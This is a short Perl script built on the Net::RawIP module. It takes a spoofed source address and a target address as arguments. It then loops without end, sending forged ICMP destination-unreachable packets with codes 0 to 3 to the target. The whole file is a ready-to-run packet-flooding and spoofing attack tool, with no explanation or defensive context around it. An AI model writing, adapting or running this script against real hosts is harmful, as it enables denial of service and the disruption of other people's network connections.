#import module
# $Cpan install Net::RawIP

use Net::RawIP;

#setup socket


my $spoof          = $ARGV[0];
my $target         = $ARGV[1];
 
my $sock =  new Net::RawIP({ icmp => {} }) or die;
 
print "[ Sending crafted packets..\n";
while () {
                $sock->set({  ip =>  { saddr  => $spoof, daddr => $target},
                              icmp =>  { type => 3, code => 3} });
                $sock->send;
                $sock->set({  icmp => { type=>3, code => 0}});
                $sock->send;
                $sock->set({  icmp => { type=>3, code => 1}});
                $sock->send;
                $sock->set({  icmp => { type=>3, code => 2}});
                $sock->send;
}